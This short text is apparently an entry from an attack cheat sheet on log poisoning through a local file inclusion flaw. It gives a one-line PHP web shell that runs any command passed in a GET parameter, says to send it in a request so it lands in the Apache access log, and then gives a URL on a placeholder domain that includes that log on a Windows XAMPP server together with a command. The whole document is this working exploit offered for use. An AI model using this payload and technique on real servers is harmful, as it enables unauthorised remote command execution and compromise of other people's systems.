# Payload. Send it on a requisition:

<?php echo '<pre>' . shell_exec($_GET['do']) . '</pre>';?>

# Access it by a LFI vulnerability:

http://vulndomain.com/file_function.php?file=c:\xampp\apache\logs\access.log&do=[Your command here] # On Windows
